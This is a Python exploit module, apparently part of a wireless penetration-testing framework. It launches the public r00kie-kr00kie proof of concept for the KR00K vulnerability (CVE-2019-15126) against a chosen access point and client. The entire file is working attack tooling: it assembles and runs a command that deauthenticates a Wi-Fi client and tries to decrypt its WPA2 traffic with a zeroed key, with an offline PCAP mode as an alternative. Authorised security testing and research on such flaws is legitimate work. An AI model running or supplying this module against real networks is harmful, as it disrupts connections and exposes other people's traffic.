#!/usr/bin/env python3
# Author: André Henrique (@mrhenrique) | União Geek — https://github.com/Uniao-Geek
# Version: 1.0.0
"""Bridge subprocess para hexway/r00kie-kr00kie (CVE-2019-15126) — KR00K / TK zero CCMP.

Invoca ``r00kie-kr00kie.py`` como subprocesso (deauth + tentativa de decriptação com TK
zerado). Não importa o código upstream no runtime do WirelessXPL.

Referência: https://github.com/hexway/r00kie-kr00kie
"""

from __future__ import annotations

import logging
import os
import shutil
import subprocess
from pathlib import Path
from typing import List, Optional

from wirelessxpl.core.exploit import *

logger = logging.getLogger(__name__)


class Exploit(Exploit):
    """Ponte subprocess para r00kie-kr00kie (KR00K, WPA2 CCMP)."""

    __info__ = {
        "name": "KR00K (r00kie-kr00kie) Bridge",
        "description": (
            "CVE-2019-15126: envia deauths (Scapy) e tenta decriptar quadros CCMP com TK "
            "zerado conforme PoC upstream. Execução apenas via subprocesso do script "
            "r00kie-kr00kie.py. Requer Scapy / ambiente do repositório clonado. "
            "Modo PCAP: -p sem interface. Modo ao vivo: interface, BSSID, canal e MAC "
            "da STA (-c) conforme assert do upstream. Version: 1.0.0"
        ),
        "authors": (
            "André Henrique (@mrhenrike) | União Geek",
            "Hexway / r00kie-kr00kie contributors (GPL-3.0, subprocess)",
        ),
        "references": (
            "https://github.com/hexway/r00kie-kr00kie",
            "https://nvd.nist.gov/vuln/detail/CVE-2019-15126",
        ),
        "devices": ("wifi", "802.11", "wpa2"),
    }

    interface = OptString("", "Interface em modo monitor (-i); obrigatória no modo ao vivo")
    target_bssid = OptMAC("", "BSSID do AP (-b); obrigatório no modo ao vivo")
    target_client = OptMAC(
        "",
        "MAC da estação cliente (-c); obrigatório no modo ao vivo (exige o assert upstream)",
    )
    channel = OptInteger(1, "Canal 802.11 (-l), default upstream 1")
    pcap_file = OptString(
        "",
        "PCAP de entrada (-p); se preenchido, apenas análise/offline no upstream",
    )
    pcap_result = OptString(
        "",
        "PCAP de saída (-r); vazio = default do script (kr00k.pcap no cwd do PoC)",
    )
    dry_run = OptBool(False, "Somente exibir o comando, sem executar")

    def _find_script(self) -> Optional[Path]:
        """Resolve ``r00kie-kr00kie.py`` no superprojeto ou ao lado do Forge.

        Returns:
            Caminho absoluto do script, ou None se não existir.
        """
        here = Path(__file__).resolve()
        candidates = (
            here.parents[5] / "r00kie-kr00kie" / "r00kie-kr00kie.py",
            here.parents[4] / "r00kie-kr00kie" / "r00kie-kr00kie.py",
            here.parents[6] / "IoT" / "r00kie-kr00kie" / "r00kie-kr00kie.py",
        )
        for c in candidates:
            if c.is_file():
                return c.resolve()
        return None

    def _python3(self) -> str:
        """Retorna intérprete Python 3 para o subprocesso."""
        for name in ("python3", "python"):
            w = shutil.which(name)
            if w:
                return w
        return "python3"

    def _norm_mac(self, raw: str) -> str:
        """Normaliza MAC para o formato esperado pelo argparse upstream."""
        s = str(raw).strip().lower().replace("-", ":")
        return s

    def _build_command(self, script: Path) -> List[str]:
        """Monta a linha de comando ``python3 r00kie-kr00kie.py ...``.

        Args:
            script: Caminho do ``r00kie-kr00kie.py``.

        Returns:
            Lista de argumentos (argv).

        Raises:
            ValueError: Combinação inválida de opções.
        """
        cmd: List[str] = [self._python3(), str(script)]
        pcap = str(self.pcap_file).strip()

        if pcap:
            if not os.path.isfile(pcap):
                raise ValueError("pcap_file deve apontar para um ficheiro existente.")
            cmd.extend(["-p", pcap])
            out = str(self.pcap_result).strip()
            if out:
                cmd.extend(["-r", out])
            ch = int(self.channel)
            if ch != 1:
                logger.info("Modo PCAP: canal %s é ignorado pelo fluxo -p upstream.", ch)
            return cmd

        iface = str(self.interface).strip()
        bssid = self._norm_mac(str(self.target_bssid))
        client = self._norm_mac(str(self.target_client))
        ch = int(self.channel)

        if not iface:
            raise ValueError("Modo ao vivo: defina interface (ou use pcap_file).")
        if not bssid or bssid == "00:00:00:00:00:00":
            raise ValueError("Modo ao vivo: defina target_bssid.")
        if not client or client == "00:00:00:00:00:00":
            raise ValueError("Modo ao vivo: defina target_client (MAC da STA).")
        if not (1 <= ch <= 128):
            raise ValueError("channel deve estar entre 1 e 128.")

        cmd.extend(
            [
                "-i",
                iface,
                "-b",
                bssid,
                "-c",
                client,
                "-l",
                str(ch),
            ],
        )
        out = str(self.pcap_result).strip()
        if out:
            cmd.extend(["-r", out])
        return cmd

    def run(self) -> None:
        """Executa o PoC KR00K ou exibe dry-run."""
        script = self._find_script()
        if not script:
            print_error(
                "r00kie-kr00kie.py não encontrado. Clone hexway/r00kie-kr00kie em "
                "submodules/IoT/r00kie-kr00kie (ou ao lado do WirelessXPL-Forge).",
            )
            return

        try:
            cmd = self._build_command(script)
        except ValueError as err:
            print_error(str(err))
            return

        cmd_str = " ".join(cmd)
        cwd = str(script.parent)
        logger.info("KR00K cwd=%s", cwd)
        logger.debug("KR00K cmd=%s", cmd_str)

        if self.dry_run:
            print_info("DRY RUN — comando:")
            print_status(cmd_str)
            print_info("cwd: {}".format(cwd))
            return

        print_status("Executando r00kie-kr00kie (KR00K)...")
        print_info(cmd_str)

        try:
            proc = subprocess.run(
                cmd,
                cwd=cwd,
                capture_output=False,
                text=True,
                timeout=None,
                check=False,
            )
        except KeyboardInterrupt:
            print_info("Interrompido pelo usuário.")
            logger.info("KR00K: KeyboardInterrupt")
            return
        except Exception as exc:
            print_error(str(exc))
            logger.exception("r00kie-kr00kie subprocess")
            return

        if proc.returncode == 0:
            print_success("r00kie-kr00kie finalizou com código 0.")
        else:
            print_error("r00kie-kr00kie saiu com código {}".format(proc.returncode))
